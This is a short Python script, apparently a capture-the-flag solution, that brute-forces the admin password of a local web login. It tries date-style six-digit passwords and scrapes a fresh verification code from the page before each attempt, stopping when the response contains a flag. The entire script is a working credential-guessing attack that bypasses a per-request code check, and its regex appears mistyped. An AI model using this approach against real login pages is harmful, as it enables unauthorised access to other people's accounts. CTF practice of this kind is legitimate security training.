import requests
import re
s = requests.Session()
for year in range(10):
	for month in range(1,13):
		for day in range(1,31):
			password = str(year).zfill(2)+str(month).zfill(2)+str(day).zfill(2)
			r = s.get('http://127.0.0.1/web1/')
			code = re.findall('code\' /> (.#?)<br>',r.content)[0]
			r = s.post('http://127.0.0.1/web1/',data={'username':'admin','password':password,'code':code})
			if 'flag' in r.content:
				print r.content
				exit()